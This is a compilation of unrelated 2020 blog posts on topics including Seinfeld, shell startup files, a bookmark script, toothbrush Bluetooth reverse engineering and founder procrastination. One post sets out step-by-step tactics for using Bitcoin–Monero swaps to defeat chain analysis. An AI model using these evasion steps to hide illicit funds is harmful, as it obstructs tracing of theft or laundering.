ways to maintain health is by focusing on your eating.</p><p>It’s fascinating to me that we eat 3-6 times/day, and yet very few people spend any time or mental bandwidth understanding food, nutrition and its role in how it shapes our body.</p><p>There are simple heuristics that can go a long way - eating fats doesn’t make you fat, sugar is a carb that affects your body similar to how alcohol does, fasting has marvellous effects on your body, the mantra for weight loss is calories in calories out, the mantra for muscle gain is reps and protein intake.<br></p><h3>14. The information you consume is what your mind becomes</h3><p>If the food you eat becomes your body, then the information you consume becomes your mind. Protect your mind as if it’s your most precious resource (it is), by filtering the sources of information that you let influence you. Even your Twitter feed is programming your subconscious without you realising it.<br></p><h3>15. How you think governs everything in your life</h3><p>If you really think about it, how you think governs your whole life.</p><p>What you eat, whether you exercise, who you date, how you treat relationships, how you learn something new, how you deal with adversity, how you treat others when you are in a position of power, how you spend your free time, how you build your business.</p><p>Everything steps from the root of your thought process, how you think.</p><p>I spent an insane amount of time in 2017-18 deliberately trying to understand my thought patterns, why I think and do the way I do, how do I actually want to be, what should I change and what should I double down upon.</p><p>You can try to do this by reading books, but the best answers will come through developing high self-awareness and doing deep self-introspection.<br></p><h3>16. Generalist skillset is a Swiss knife</h3><p>Over the past few years, I’ve followed a simple mantra to learn whatever hard or soft skills can improve my skill tree required to build successful businesses.</p><p>I visualise it like the skill tree in an RPG game. You can’t unlock and master all branches, so you have to be selective in nurturing the right set of skills.</p><p>Thanks to this mindset, I learnt how to think about product, learnt how to design, simple coding but more importantly understanding the fundamentals of tech, and now I’m learning to become a great marketer.</p><p>This Swiss Army knife is what helps me understand and imagine better ways to achieve the goals we have set to build DelightChat.</p><p>And this doesn’t just apply to entrepreneurs.</p><p>If you’re a designer, you need to understand product management and technology to understand how design fits in between.</p><p>If you’re a marketer, you need to know how to write copy or design creatives or build landing pages in addition to coming up with a marketing strategy.<br></p><h3>17. The real meta-skill is the ability to learn</h3><p>And during this journey I realised that the actual ability isn’t being able to design, or manage product, or write great copy. The real meta-skill is the ability to learn new skills as they become important in your journey. <br></p><h3>18. Don’t chase people, become valuable instead</h3><p>Whenever a friend asks me “How do I make her like me?” or similar question, my answer …</p></div></div>

October 24, 2020 | https://www.sankalpjonna.com/posts/a-blog-post-about-nothing | <a href="https://web.archive.org/web/*/https://www.sankalpjonna.com/posts/a-blog-post-about-nothing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago, me and my team made a pact that each of us will write something every weekend. What we write about depends on what influenced the individual during that week that was worth sharing with the world.<br></p><p>As it turns out, my job is to write software and most of my time during the week is spent on solving technical challenges. Sometimes I can write about these challenges and how I solved them, but sometimes I can’t because we are too early in our journey of building <a href="https://www.delightchat.io/" target="_blank">delightchat.io</a> to be able to make our core architecture decisions public. <br></p><p>So what do I write this week that will help folks reading it learn something? Here is a radical thought - what if I write about something that doesn’t have any lesson at all? Does good content always need a theme and an underlying concept that helps somebody do something better?<br></p><h3><strong>Seinfeld - a show about nothing</strong><br></h3><p>For those who are not familiar, Seinfeld was a very popular sitcom that aired from the early 90s to the late 90s and it is generally referred to as “a show about nothing”. <br></p><p>This is only a half truth because Seinfeld is actually a very well written show with intricate plots that seem random at first but tie up pretty smoothly towards the end of an episode. The real reason it is a show about nothing is because unlike other sitcoms, the episodes do not have a theme. &nbsp;There is no lesson that the characters learn and evolve as human beings, there is no hidden metaphor that teaches you morals and values of how to navigate life.<br></p><p>The show instead focuses on whimsical scenarios that the characters face as a result of being selfish and inconsiderate. The episodes involve characters getting into conflicts during their day to day interactions with friends and family and how they handle the conflict while learning absolutely nothing in the process.<br></p><h3><strong>Why I think this is important</strong><br></h3><p>Despite everything you just read about Seinfeld, this was one of the most if not the most wildly successful sitcoms of all time and every sitcom since Seinfeld tries to embody some aspect of this in their plots. If not in the main plot there are sub plots which are about people screwing up and learning nothing. And this is for the simple reason that the show was very entertaining.<br></p><p>Sometimes all we really need in life is a creative way to pass the time. We are not in a race to constantly better ourselves, become the post possible version of ourselves, learn new things and kill it in life every single day. Some days are just slow and unproductive. And these days matter because otherwise how do we value the days where we do kill it in life?<br></p><p>We are fed this notion that everyone needs to chase a goal in life and every single day must be an attempt to get one step closer to that goal. For the record, I do think we should all have something that drives us and fuels the machine that keeps us going in life, but this doesn’t mean that the machine can’t rest and do nothing once in a while. <br></p><h3><strong>Life is long</strong><br></h3><p>The phrase “life is short” is quite popular. It is meant teach folks that every day must be lived to the fullest because we are all going to die someday and the last thing we want is to miss out on anything worthwhile.<br></p><p>But if you think about it, unless everyone has a terminal disease or gets into an accident, the average life expectancy of a person is over 70 years. This seems like a long time to be able to live life to the fullest every single day! <br></p><p>Life is long enough to waste a few days on doing nothing and let the brain and the body cool off and blow some steam. Life is long enough to let a few days pass without learning something new or accomplishing something. Life is long enough to waste time reading this article even though it doesn’t teach you anything.<br></p><h3><strong>Why did I write this article?</strong><br></h3><p>If you are still reading this despite me telling you that you will learn nothing from this, it means that you were most likely just browsing the internet while looking for nothing in particular. And that’s why I wrote this article - to help you pass the time and remind you that it is completely okay to do so.<br></p><p>If by any chance you are reading this while sipping your morning coffee or having a meal, or in general while performing a pretty uneventful task, I hope I kept you engaged. This is what Seinfeld did for me.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div><p>Monero cryptographers <a href="https://eprint.iacr.org/2020/1126.pdf" target="_blank" rel="noopener noreferrer">recently discovered</a> how to conduct “atomic swaps” between Bitcoin and Monero. This means that any two people can swap Bitcoin for Monero between them without relying on any third-party service, using only software they run themselves.</p><p>As Monero is the god of privacy coins (and the blockchain <a href="https://icryptonode.com/products/monero-icryptonode-raspberry-pi-device" target="_blank" rel="noopener noreferrer">we develop products for</a>), this naturally led to speculation that this innovation would enable Monero to become a layer-2 privacy solution for bitcoin, which is itself <a href="https://www.chainalysis.com/" target="_blank" rel="noopener noreferrer">notoriously traceable</a>.</p><p>Over the past week I have read all manner of incorrect information from uninformed commenters about if this is possible, how it will work, and what this means for Monero and Bitcoin.</p><p>Let me state clearly -</p></div>

<div><p>But it’s a Yes* (with an asterisk!). Let me explain:</p><p>Bitcoin is a public blockchain - the ledger is entirely open for analysis. This creates a perfect trail of transactions, allowing anyone to see the path of bitcoin from “freshly mined” to person A to B to C and so on. Bitcoin users who wish to maintain privacy have to do additional steps, such as using a mixing-wallet like <a href="https://www.wasabiwallet.io/" target="_blank" rel="noopener noreferrer">Wasabi</a>. Using Wasabi is an imperfect solution, has fees, and requires a relatively large amount of money to use. Another option is to trust a third-party like a centralized exchange. Either way, “breaking the chain” of bitcoin transactions to establish privacy is difficult, expensive, usually involves trusted third-parties, and is not guaranteed to maintain privacy forever as Chainalysis and similar firms become more sophisticated at tracing bitcoin transactions.</p><p>Bitcoin / Monero atomic swaps will establish privacy in a fully decentralized way - one that doesn’t rely on mixing technology or third-party trusted services. The way it will work is thus:</p><p>Alice currently owns bitcoin, but because of blockchain-analysis it’s trivial to know she purchased it at Coinbase. Fearing for her safety from an abusive ex-boyfriend, Chad, who works for the government and has access to Chainalysis software, it’s absolutely essential that Alice hides her bitcoin. Once Alice’s bitcoin is unlinked from her ownership, no one can prove she owns it, thus maintaining her personal safety.</p><p>Alice must do two trades - first, she swaps her bitcoin for an equivalent amount of Monero using an atomic swap and a counterparty she found in a decentralized exchange. She trades 1 BTC for 10 XMR.</p><p>Next, Alice swaps her XMR back to BTC. The market moved against her slightly - she now trades 10 XMR for 0.99 BTC, plus a small amount for network fees. Alice ends up with 0.9895 BTC.</p><p>Now, Alice has bitcoin that cannot be traced to her identity - she “broke the chain” that linked the purchase to her own identity. Alice never had to speak to anyone or trust any third-party service for doing so. She did work with two counterparties (trades from BTC to XMR and then XMR to BTC), but had no knowledge of who they were and never spoke with them, relying on software to conduct the swap peer-to-peer. She could not be scammed - provided she agreed with the trade amounts, it was mathematically impossible for her to lose her money at any step of the way - that’s why this is “trustless”.</p><p>Now, Alice has bitcoin she can save or spend anonymously. If she ever has a reason to anonymize more bitcoin, she can use the same steps to convert unsafe bitcoin to safe bitcoin, using the Monero blockchain as a privacy layer. Her wealth is now safe from Chad, the government rapist.</p></div>
<h2>Risks of Bitcoin to Monero Atomic Swaps</h2>
<div><p>As mentioned previously, <strong>Alice cannot be scammed using atomic swaps</strong>. Mathematics will perfectly protect her from a counterparty that tries to steal her money.</p><p>The biggest risk to Alice comes from <em>time</em> - the longer she waits, the less likely blockchain analysis will be able to track her, but the more likely the price will move against her.</p><p>Why is waiting important? Just like with <a href="https://tornado.cash/" target="_blank" rel="noopener noreferrer">tornado.cash</a>, if Alice were to quickly swap into XMR and back out into BTC, there will likely be few or no swaps other than her’s. This would make it probabilistically quite likely that the second BTC output is Alice’s. Alice should wait for several other swaps to occur before she executes her swap back into BTC.</p><p>Another risk is in the size of outputs. If Alice swaps 9.347 BTC into XMR, then swaps 9.347 back out, it’s highly likely it’s her’s.</p><p>Therefore, Alice should 1) Wait a while holding XMR (hours or days), and 2) make several, staggered transactions back into BTC from XMR. The biggest danger here is the price of Monero moving against Bitcoin, but it will likely be worth it to maintain privacy.</p><p>I anticipate that services will be created that make anonymizing Bitcoin simple and safe using standard output amounts (0.1, 1.0, 10.0 BTC, etc.) similar to tornado.cash.</p><p>One final note - I assume that chain-analysis can determine which bitcoin outputs are used for Monero atomic swaps. Given that the Bitcoin script used for the 2-of-2 Bitcoin locks is extremely specific, I assume that all Bitcoin UTXOs used for Monero swaps will be tracked. If Monero researchers find a way to obfuscate all atomic swap transactions among normal transactions, privacy can be greatly increased. But given the amount of intense research this solution will inevitably attract, it is unlikely “hiding among the crowd” will be possible. This is also why waiting after a swap will be extremely important.</p></div>
<h2>Conclusion</h2>
<p>Monero can indeed be used as a layer-2 privacy solution for Bitcoin. It is not perfect, and risks with timing and transaction size can compromise privacy. But Monero is currently the only trustless, fully-decentralized solution for enhancing privacy on Bitcoin and I anticipate that it will become extremely popular.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>What do I want the future to be like? What amazing inventions do I want to see, and help build in my lifetime? I realized this morning that I don’t know. I was shocked.</p> <p>I’ve been tinkering with technology since I was a child, and I’ve been investing in early-stage companies for the past five years. More than sixty bets on the future. I’m meant to have bold visions of a better world, theses I support, and capital that I allocate in a technologically optimistic way. I began investing in startups because I wanted to help shape the future. And while I still get excited talking to founders with bold ideas, I have none of my own.</p> <p>When I was a teen, growing up on a diet of Carl Sagan’s Cosmos and Alvin Toffler’s Futurism, I had plenty of big ideas: spaceflight, supersonic travel, mag-lev trains, geodesic domes, bio-nanotech for longevity, and social organization to provide maximum freedom for all. Cheesy, but optimistic.</p> <p>Now I am 29 and I have no big, optimistic ideas. I think of plenty of arbitrages and improvements in efficiency. And while I believe that better infrastructure enables more construction and innovation, closing an obscure pricing gap just isn’t like dreams of great adventure and exploration on the frontier of human experience and possibility.</p> <p>I spend much time thinking about solutions to existing problems – the incentive mismatch in mass media that is causing accelerating polarization, how to remedy the effects of climate change, and so on. But these are all <em>fixes</em>, reactions. It feels like I’m in the belly of the ship, frenetically plugging leaky holes, never even having the space of mind to think <em>where the ship should go</em>. Ostensibly, those decisions are made on the bridge of the ship, which, in October 2020, seems to be populated by well-intentioned individuals, but hamstrung in their ability to make good collective decisions.</p> <p>Recent years have shown me how difficult it is to make <em>any</em> meaningful public decision. Every debate is endlessly contentious, every subject has meaningful nuance, and every decision has exceedingly hard-to-predict second-order-effects. The world is much more complex than it was even twenty years ago, and the effects are paralyzing. This is clearly felt among policymakers, but I feel it even as a technologist: I understand that virtually all tools can be used – and more often than not, <em>will</em> be used – for both good and evil, and how hard the results are to predict over years in our dynamic world. I learned that technology can rarely solve fundamental social problems, and I’ve seen the public perception rollercoaster of “this technology/person/policy is good” to “this is evil” more times than I can count.</p> <p>This puts me in a real bind for having high-conviction views that aren’t microscopically focused. As an example, for the past few years I have struggled developing a long-term view on bitcoin. By network effect, I think it is clear that in the long term, we will have <em>either</em> fiat or crypto – either fully centralized or fully decentralized – not both. Which world do I want to live in? I’m not sure. On the one hand, it is clear that our existing US financial system is fragile with systemic risk, a playball exposed to potentially irresponsible governance. You might call its mechanics unfair to the masses, but you’d also need to point out that it has <em>actually worked</em> in creating prosperity over the past 110 years. (And, comparing the US to other countries, it has worked remarkably well!) I agree with need for overhaul of the system, but I’m not sure if it’s wise throw out the entire thing and open up the world’s largest power vacuum in the process. This rarely ends well. I cannot tell, with intellectual honesty, which avenue is best to pursue. I doubt that anyone does.</p> <p>Other arenas of big problems and changes yield similar dilemmas. Perhaps consequently, I have found myself not dreaming big anymore. I dream small, where the effects are predictable. On dreaming big, there is the paralysis of responsibility and effects, but there is also a level of cynicism that has come to me over the years, as big dreams turn out to be much more fraught and complicated as they move into reality. The nuance, complexity, difficulty, responsibility, and often <em>irreversibility</em> in effecting big changes has slowly removed the stars from my eyes as I look at technology. Maybe that’s a good thing as I come to appreciate the gravity of change.</p> <p>But at the same time, if we don’t take big, bold, bets, we’ll be forever stuck in the valleys of local optima. As Bezos says, the size of your risk-taking should increase with the size of your enterprise – at scale, we should be taking many daring gambles, all the time. But it doesn’t feel like that’s really happening. It feels like we spend lots of effort debating marginal nuance, sitting in the belly of the ship doing maintenance, rather than charting the course forward.</p> <p>It is difficult to be an optimist in 2020. I admire the few<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup> that still have the courage to dream big and to remind ourselves that there <em>is</em> a future that could be amazing and that is worth fighting for.</p>  <hr>  <br> </article> </div></div>]]>

<![CDATA[A simpler approach to bookmarks]]>

October 24, 2020 | https://www.samhh.com/blog/simpler-bookmarks/ | <a href="https://web.archive.org/web/*/https://www.samhh.com/blog/simpler-bookmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We all use the web, and we all use bookmarks. But did you know that you don’t have to use the bookmarking functionality built into your web browser?</p>
<p>This is why a while ago I migrated to <a href="https://github.com/jarun/buku">buku</a> and, at the time still pretty much living inside my web browser, I wrote <a href="https://github.com/samhh/bukubrow-webext">Bukubrow</a>. (I’m really creative at naming things as you can see!)</p>
<p>Any external bookmark manager is a ton better than using that which is built into your browser for one key reason - you’re no longer tied to a specific browser. Sure, you might (?) be able to import and export those bookmarks around, but it’s a hassle and not something I’d want to rely upon as browser vendors struggle to find reasons to differentiate, leaving platform lock-in increasingly tempting. I’m certain at one point it wasn’t possible at all, but I assume and hope that in the many years since things have improved.</p>
<p>You want to know something really annoying about buku? It’s written in Python. This means that, as the interpreter starts up on each <code>buku</code> invocation on the command-line, there’s a perceptible delay that isn’t present on any piece of software written in C, Rust, Go, Haskell, et cetera. (The same problem plagues JavaScript to an even worse extent.) It’s a terrible user experience. When you’re used to your terminal opening in mere milliseconds, this delay is extremely annoying. (Side note: If you’re running something like <a href="https://github.com/alacritty/alacritty">Alacritty</a> and your prompt isn’t ready virtually immediately then you’re probably using something like Oh My Zsh!, which butchers the startup time of the prompt.)</p>
<p>Something else annoying about Python is the state of its package management. People rag on JavaScript projects’ complex and slow build systems, but at least once it’s distributed the end user typically has a single bundled script to run, just as with the other languages I’ve mentioned you’d generally have a single binary. Seemingly not so with Python! Installation of buku is painful because it carries with it a bunch of dependencies I don’t care about. These are implementation details for the author, and they probably shouldn’t be updated independently on my system. Can you imagine if all software was like this? You’d barely be able to go five minutes on Arch without some sort of dependency (of a dependency of a dependency) update requiring an update. <a href="https://beets.readthedocs.io/en/stable/">beets</a>, also written in Python, as much as I love it, suffers these same issues.</p>
<p>This led me to wonder what alternatives are out there. After being broadly unsatisfied with what I found, and having spent a while really enjoying <a href="https://www.passwordstore.org/">pass</a>, I decided to roll my own solution. What started out as a vague idea to write a “simple” bookmark manager in Haskell a la pass resulted in a truly simple shell script. Introducing <a href="https://github.com/samhh/dotfiles/blob/bcb15d05274478d78b4eecb7f56dd813f15a9dbe/home/scripts/flatmarks.sh">flatmarks</a>, a script so simple it doesn’t even warrant its own project page.</p>
<p>This script depends upon only a single tool, <a href="https://github.com/davatorium/rofi">rofi</a>, something a lot of folks running Linux with tiling window managers will already be using. It could be trivially updated to use <a href="https://tools.suckless.org/dmenu/">dmenu</a> or something else that can handle the interactive aspect. All it does is recursively collect the name of every file in a specified directory, present them to the user, and open the first line of the selected file in the browser. (Okay, technically it could open other stuff too as it’s calling <code>xdg-open</code>, but I’m not sure what else you’d put here. Maybe links to <a href="https://gemini.circumlunar.space/">Gemini</a>?)</p>
<p>The bookmarks directory itself can be thought of in the same way as pass’ password repo, except it’s lacking encryption. I suppose that could be quite easily implemented as well if you felt that necessary.</p>
<p>What does this look like in practice? I have a directory <code>~/.bookmarks/</code>, managed by git and backed up to a private remote somewhere, within which I have all my bookmarks. Most of them live at the root, but some are organised inside subdirectories. If ever I delete something and want it back, it’s right there in my git history. I don’t need to do anything at all if I change web browser. When I want to open a bookmark, regardless of where I am, I open <a href="https://github.com/samhh/dotfiles/blob/0f25b2e7cf4ca26482221347afac0034fee9f921/home/xmonad-samhh/Main.hs#L273">the keybind defined in my window manager</a>, which’ll open it up in my web browser of choice, currently <a href="https://github.com/fanglingsu/vimb">vimb</a>. When I want to add a bookmark I simply pop it into the repo and, if I want to keep it around for more than just a brief period of time, I commit it.</p>
<p>It’s a little more upfront work but the end result, in my eyes, is a lot simpler. It’s more ergonomic and it’s far less hostile to customisation and change. That seems to be the tradeoff with a lot of technology, Linux on the desktop as another example. The same can be said for a lot of the other software I’ve mentioned in this post too. But it’s totally worth it.</p>
<p>For anyone still using Bukubrow, this is why there hasn’t been much activity. It’s not abandoned, but I also don’t have much impetus to work on it as I did before as I no longer use it myself. You, too, might find a bash script and a git repo to be superior to anything more proprietary anyway.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>Update (2020-03-29)</p>
<p>When I originally wrote this blog post, my intent was to describe how things
worked on a typical system at the time.
Unfortunately, the operation of bash startup scripts is dependent on
patches added by OS distributions, compile-time options and if bash thinks
it was invoked by sshd or rshd.
I have no desire to add complexity to this post, so instead please
read this as a rough approximation of the truth.
If you want to know for certain how it works on your system, the only answer
is <em>test it yourself</em>.</p>
</div>
<p>If you’re a regular shell user, you’ve almost certainly got a
<tt>.bash_profile</tt> or <tt>.bashrc</tt> script in your home folder,
which usually contains various tweaks, such as setting environment variables
(adding that directory to <tt>$PATH</tt>), telling your shell to do clever things
(like <tt>set <span>-o</span> noclobber</tt>) and adding various aliases to commands
(like <tt>alias please=sudo</tt>).</p>
<p>(If you’re really organised, you’ll have all your dotfiles in a repository
somewhere so that you can keep your settings synchronised across all the
machines you work on.)</p>
<p>Anyhow, I suspect that few people know when things like <tt>.bash_profile</tt> and
<tt>.bashrc</tt> actually get executed. When I started, I just followed people’s
advice of putting stuff in <tt>.bashrc</tt>, and then when it didn’t work, into
<tt>.bash_profile</tt>.
I could stop here and describe just the bash startup process (as silly as it
is), but there’s a complication in that I switched to zsh a few years ago
(and haven’t looked back), but occasionally use bash on machines which don’t
have zsh installed.</p>
<p>In order to handle this nicely then, I need to be able to specify things which
are specific to bash or zsh in their own files, and then to specify things
which any POSIX-compliant shell (like aliases and environment variables) can
understand in a common startup file.</p>
<p>My solution to this problem is to define some new dotfile folders,
one for each shell (<tt>.bash/</tt>, <tt>.zsh/</tt> and <tt>.sh/</tt>), and one for the
shell-independent files (<tt>.shell/</tt>):</p>
<div><pre><span></span>.bash/
    env
    interactive
    login
    logout
.sh/
    env
    interactive
    login
.shell/
    env
    interactive
    login
    logout
.zsh/
    env
    interactive
    login
    logout
</pre></div>
<p>“But!”, you say, <a href="#since" id="id1">[1]</a> “what do the different files in here do?”
Ah, well I’m glad you asked.
There are two kinds of shells:</p>
<ul>
<li>[non-]interactive shells (you type into them / shell scripts)</li>
<li>[non-]login shells (the shell run when you first login / subshells)</li>
</ul>
<p>All shells will first run <tt>env</tt>, then login shells will run <tt>login</tt>,
then interactive shells will run <tt>interactive</tt>.
Once finished, login shells will run <tt>logout</tt>.</p>
<div id="where-to-put-stuff">
<h2>Where to put stuff</h2>
<p>It all depends on when it needs to be run.</p>
<p>If it’s setting / modifying environment variables, it should go in <tt>login</tt>.
If it’s alias or a terminal-specific environment variable (e.g., GREP_COLOR),
it should go in <tt>interactive</tt>.
In my <tt>.shell/env</tt> file, I have my umask set, and also define some useful
functions for modifying colon-separated path environment variables (like
$PATH).</p>
<p>Even if you don’t adopt anything else from my scheme, I’d recommend you take a
look at the what my functions are doing which differs from something like
<tt>export <span>PATH=$PATH:/path/to/dir</span></tt>.</p>
<p>That particular pattern is way too common, and is very dangerous if you
consider the case when <tt>$PATH</tt> (or whatever your variable is, like
<tt>$LD_LIBRARY_PATH</tt>) isn’t set.
Then, the value will be <tt>:/path/to/dir</tt>, which usually means both
<tt>/path/to/dir</tt> <em>and the current directory</em>, which is usually both unexpected
behaviour and a security concern.</p>
<p>With my implementation (see <tt>.shell/env_functions</tt>), you can append, prepend
and remove directories from any colon-separated environment variable, and when
appending or prepending, you are guaranteed that directory will only then
appear in that variable once.</p>
<p>As a side note, I’m very disappointed in my <tt>indirect_expand()</tt> function,
so if you have a better solution, please let me know (or send me a pull request).</p>

<h2>Implementation</h2>
<p>In order to implement this, you first need an understanding of which startup
files are run in each case.
Of course, this isn’t hard, since all the shells have the same, sensible
system. Ahahaha, no.</p>
<p>Fortunately, I’ve read the man pages for you, and drawn a pretty diagram.
To read it, pick your shell, whether it's a login shell, whether it's
interactive, and follow the same colour through the diagram.
When the arrows split out to multiple files, it means that the shell will try
to read each one in turn (working left to right), and will use the first one it
can read.</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup.png"></p><p>An important point here is that if you have a non-login, non-interactive shell
running a plain POSIX shell (dash, bash in sh compatibility mode), it <em>won’t
fulfil</em> our contract in that it won’t read <tt>.sh/env</tt>
(and hence <tt>.shell/env</tt>).</p>
<p>The other special case which exists is Bash’s remote shell mode (which is
rather warped), where it tries to detect if it’s running under ssh or rsh (I
assume by looking at the process name of its parent), and if so, follows a
different path, which is indicated on the diagram.</p>
<p>Except that diagram shows what happens according to the man page, and not what
happens when you actually try it out in real life.
This second diagram more accurately captures the insanity of bash:</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup-actual.png"></p><p>See how remote interactive login shells read /etc/bash.bashrc, but normal
interactive login shells don’t? Sigh.</p>
<p>Finally, <a href="http://hg.flowblok.id.au/shell-startup">here’s a repository</a> containing my implementation and the graphviz
files for the above diagram.
If your POSIX-compliant shell isn’t listed here, or if I’ve made a horrible
mistake (or just a tiny one), please send me a pull request or make a comment
below, and I’ll update this post accordingly.</p>

            <p>Since a few month I own an electrical toothbrush from Phillips called <a href="https://www.google.com/search?q=Sonicare+HX992B">Sonicare HX992B</a>. It connects to <a href="https://play.google.com/store/apps/details?id=com.philips.cdp.ohc.tuscany" title="App">an mobile App</a> using Bluetooth that tells you how well you brushed your teeth, shows the orientation in real-time, and also notifies you when to change the brush for a new one.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-image.jpeg" alt="Phillips Sonicare"></p>
            <p>I was curious how this exactly works. Since the application uses Bluetooth Low Energy (BLE), I used the <a href="https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp">nRF Connect</a> app for Android to get a list of advertised services.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/whatsapp-image-2020-10-09-at-19-34-24.jpeg" alt="Screenshot of nRF connect" title="Screenshot of nRF connect"></p>
            <p>Now I had a list of 12 BLE services of which only four are <a href="https://www.bluetooth.com/de/specifications/gatt/" title="List of common services">standard services described on bluetooth.com</a>. In addition to well-known services like Generic Access, Generic Attribute, Device Information and Battery Service, also eight custom services exist, that were created by the manufacturer. Every one of the first seven service UUIDs starts with <code>477ea600-a260-11e4-ae37-0002a5d5000</code> and ends with a number from 1 to 8 with number 3 missing. An additional eight service has a completely different prefix than the others.</p>

            <p>By switching the device on and off, changing the strength and mode and also by changing the brush back and forth, I was able to identify some of the characteristics of the six services. By reverse engineering the code of the Android app using <a href="https://github.com/skylot/jadx">jadx</a> I found information about the session storage and many other things.</p>

            <p>According to the application sources, the last unknown service is called “Moonshine Streaming” and is used to update the firmware. I agreed with myself to not touch this one, since I could damage the firmware and would need to brush my teeth by hand again.</p>
            <p>Since I could see a very course orientation displayed in the app during a cleaning session, I expected orientation data somewhere in the characteristics. I found them in the service <code>5</code>. Once you enable notifications for the <code>4130</code> service, you get a data stream to byte arrays. It turns out, these are indeed the values of the gyroscope.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you are an indie hacker or a solo founder, you probably realize that you have to wear many hats and simultaneously juggle many balls. Building and running a successful business requires you to be a developer, a marketer, customer support, and everything else that a business may need to survive.&nbsp;<br></p><p>But let me ask you a question. Of all those hats I mentioned, which one you wear the most? Well, if you have a technical background and know-how to code -like myself-, I bet it's the developer's hat. If you are aware of this and don't mind, simply because you enjoy coding and building a profitable business is not your highest priority, you probably don't need to read the rest of this article.<br></p><p>However, if profitability&nbsp;<strong>is</strong>&nbsp;your priority, but coding still takes +90% of your time, then maybe it's worth pausing for a minute to ask yourself, why? For me, that's the case. Coding takes a big chunk of my time. I enjoy coding, and I'm good at it. So it seems like spending my time coding is a "choice", at least, this is what I thought.<br></p><p>Last week, after <a href="https://www.jamalx31.com/sunday-tldr/themed-days">implementing themed days (newsletter email)</a>, I set a deadline for myself on Saturday to post on Reddit to promote my startup, Hatchy. I procrastinated on that for two weeks by then, so I promised myself that I would post no matter what, and I won't care if the product was ready.<br></p><p>Saturday came, and I kept my promise. I posted, and I received some excellent feedback, but also some critics. That's normal; what was interesting to me is the feeling I had every time I opened Reddit or IndieHackers to check the comments. I felt sick, stressed like I'm about to go naked on stage to deliver a speech. It's my fear of public embarrassment. That bit was kind of clear to me, but what it has to do with coding? I didn't make the connection straight away, but later on I&nbsp;read this:&nbsp;<br></p><blockquote>As Voltaire once wrote, "The best is the enemy of the good."<p>I refer to this as the difference between being in motion and taking action. The two ideas sound similar, but they're not the same. When you're in motion, you're planning and strategizing and learning. Those are all good things, but they don't produce a result.</p><p>Action, on the other hand, is the type of behavior that will deliver an outcome. If I outline twenty ideas for articles I want to write, that's motion. If I actually sit down and write an article, that's action. If I search for a better diet plan and read a few books on the topic, that's motion. If I actually eat a healthy meal, that's action.</p><p>Sometimes motion is useful, but it will never produce an outcome by itself. It doesn't matter how many times you go talk to the personal trainer, that motion will never get you in shape. Only the action of working out will get the result you're looking to achieve.</p><p>If motion doesn't lead to results, why do we do it? Sometimes we do it because we actually need to plan or learn more. But more often than not, we do it because motion allows us to feel like we're making progress without running the risk of failure. Most of us are experts at avoiding criticism. It doesn't feel good to fail or to be judged publicly, so we tend to avoid situations where that might happen.&nbsp;<strong>And that's the biggest reason why you slip into motion rather than taking action: you want to delay failure.</strong>" </p><p>- Atomic Habits, James Clear</p></blockquote><p>‍</p><p>It was the "aha!" moment. Coding is my motion. It's easy to be in motion and convince yourself that you're still making progress. You keep adding new features, fixing bugs, and re-styling your landing page, thinking to yourself how much progress you made. When I fact, you are just procrastinating on all the other important stuff.&nbsp;<br></p><p>In August, Chris McCormick shared a shocking post on IndieHackers.&nbsp;<a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174" target="_blank">Only ~1% of 17,207 people who have joined Indie Hackers makes more than $2k MRR</a>. Of course, the data is not 100% accurate, but that doesn't discard that it's so hard and takes a long time for a solo founder to build a sustainable business. But maybe there is more to that than just the fact it's hard.<br></p><p>What if you are stuck on the "coding wheel"? What if it's taking so long not only because it takes time to build but also because you systematically slip into motion rather than taking action? What if you keep yourself busy coding to delay failure and, as a result, delay success?</p><p>‍</p></div></div>]]>

<p>You won't go to hell for these, but you should probably look at the manpage. Some programs are just limited, but hey, you can't expect every program to provide a printf function, a date formatter and handling of input from stdin.</p>

<h2 id="Undeclarative%20%3Ccode%3Egrep%3C/code%3E">Undeclarative <code>grep</code></h2>

<p><code>grep</code> is a true power tool in Unix, but can be abused. Here is an example (by me ðŸ˜®):</p>

<p><code>date --date="$(stat "$4/${i%\.html}.md" | grep Modify | cut -d':' -f2-</code></p>

<p>Poor old skuzzymiglet then had no idea about <code>stat --printf</code>, which has useful options for printing times:</p>

<pre><code>%w     time of file birth, human-readable; - if unknown
%W     time of file birth, seconds since Epoch; 0 if unknown
%x     time of last access, human-readable
%X     time of last access, seconds since Epoch
%y     time of last data modification, human-readable
%Y     time of last data modification, seconds since Epoch
%z     time of last status change, human-readable
%Z     time of last status change, seconds since Epoch
</code></pre>

<p>The human-readable dates are fixed-format, so you can just <code>date "your_cool_format" --date="@$(stat --printf="%Y" whatever_you_want)"</code></p>

<p>Generally, a <code>printf</code> like option is useful in programs - it discourages scraping and greatly shortens pipe sequences. But alas, most programs will need to be grepped.</p>

<h2 id="Functions">Functions</h2>

<p>It sounds weird but I believe functions are a shell code smell. The problem is that with a function, you expect paramater names (and types if you're a reasonable person ðŸ˜€). However, you'll find it's just like command-line arguments, and if you don't have the time to use <strong>getopt(1)</strong>, you'll be addressing by index.</p>

<p>Or you could just reassign to variables:</p>

<p><em>(from <a href="https://www.romanzolotarev.com/ssg.html">ssg5</a>)</em></p>

<pre><code>render_sitemap() {
    urls="$1"
    base_url="$2"
    date="$3"

    echo '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
    echo '&lt;urlset'
    echo 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
    echo 'xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9'
    echo 'http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd"'
